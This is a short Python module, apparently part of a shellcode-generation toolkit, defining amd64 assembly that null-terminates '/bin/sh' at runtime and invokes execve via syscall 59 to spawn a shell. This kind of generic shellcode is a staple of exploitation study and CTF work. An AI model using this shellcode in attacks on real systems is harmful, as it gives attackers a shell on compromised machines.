from ..BaseModule import BaseModule


class Module(BaseModule):
    def __init__(self, target='/bin/sh'):
        params = {'exec_target': target}

        data = '''
        sh:
            .ascii "{exec_target}"
        eol:
            .byte 0xff
        '''
        code = '''
        exec:
            xorl %eax, %eax
            # stack is executable, i can do this
            movb %al, eol(%rip)
            leaq sh(%rip), %rdi
            # sys_execve
            movb $59, %al
            xorl %edx, %edx
            xorl %esi, %esi
            syscall
        '''
        super().__init__(
            name='Sys_execve', arch='amd64',
            code=code, data=data, params=params
        )
